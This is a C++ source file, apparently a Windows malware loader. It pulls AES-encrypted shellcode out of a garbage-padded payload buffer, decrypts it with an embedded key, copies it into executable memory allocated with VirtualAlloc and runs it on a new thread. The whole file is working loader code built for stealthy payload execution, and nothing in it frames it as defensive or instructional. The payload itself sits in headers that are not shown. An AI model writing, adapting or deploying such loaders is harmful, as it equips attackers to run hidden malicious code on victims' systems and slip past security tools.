// final_loader_with_garbage.cpp

#include <iostream>
#include <vector>
#include <windows.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>

#include "encrypted_payload.h"
#include "aes_key.h"
#include "meta.h"

using namespace CryptoPP;

std::vector<uint8_t> aes_decrypt(const std::vector<uint8_t>& encrypted, const std::vector<uint8_t>& key) {
    ECB_Mode<AES>::Decryption decryptor;
    decryptor.SetKey(key.data(), key.size());

    std::string decrypted;
    StringSource ss(
        encrypted.data(), encrypted.size(), true,
        new StreamTransformationFilter(decryptor, new StringSink(decrypted))
    );

    uint8_t pad_len = decrypted.back();
    decrypted.resize(decrypted.size() - pad_len);

    return std::vector<uint8_t>(decrypted.begin(), decrypted.end());
}

void execute_shellcode(const std::vector<uint8_t>& shellcode) {
    LPVOID mem = VirtualAlloc(nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode.data(), shellcode.size());
    HANDLE thread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
    WaitForSingleObject(thread, INFINITE);
}

int main() {
    try {
        std::cout << "[+] Extracting real encrypted shellcode from payload...\n";

        std::vector<uint8_t> real_encrypted(
            encrypted_payload.begin() + start_offset,
            encrypted_payload.begin() + start_offset + encrypted_length
        );

        std::cout << "[+] Decrypting shellcode...\n";
        std::vector<uint8_t> decrypted_shellcode = aes_decrypt(real_encrypted, aes_key);

        std::cout << "[+] Executing shellcode...\n";
        execute_shellcode(decrypted_shellcode);
    }
    catch (const std::exception& e) {
        std::cerr << "[!] Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
